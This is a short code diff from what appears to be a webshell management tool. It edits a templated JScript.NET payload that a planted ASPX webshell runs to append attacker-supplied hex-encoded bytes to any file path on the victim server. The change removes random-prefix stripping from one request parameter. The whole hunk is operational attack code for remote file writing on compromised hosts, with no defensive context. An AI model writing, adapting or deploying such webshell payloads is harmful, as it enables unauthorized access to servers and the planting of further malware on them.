@@ -45,7 +45,7 @@ module.exports = (arg1, arg2, arg3) => ({
       // fs:System.IO.FileStream=new
       // System.IO.FileStream(P,System.IO.FileMode.Create);fs.Write(B,0,B.Length);fs.Cl
       // ose();Response.Write("1");`, 修改写入模式Create->Append
-      `var P:String=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"].substr(#randomPrefix#)));var Z:String=Request.Item["${arg2}"].substr(#randomPrefix#);var B:byte[]=new byte[Z.Length/2];for(var i=0;i<Z.Length;i+=2){B[i/2]=byte(Convert.ToInt32(Z.Substring(i,2),16));}var fs:System.IO.FileStream=new System.IO.FileStream(P,System.IO.FileMode.Append);fs.Write(B,0,B.Length);fs.Close();Response.Write("1");`,
+      `var P:String=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"].substr(#randomPrefix#)));var Z:String=Request.Item["${arg2}"];var B:byte[]=new byte[Z.Length/2];for(var i=0;i<Z.Length;i+=2){B[i/2]=byte(Convert.ToInt32(Z.Substring(i,2),16));}var fs:System.IO.FileStream=new System.IO.FileStream(P,System.IO.FileMode.Append);fs.Write(B,0,B.Length);fs.Close();Response.Write("1");`,
     [arg1]: "#{newbase64::path}",
     [arg2]: "#{buffer::content}"
   },
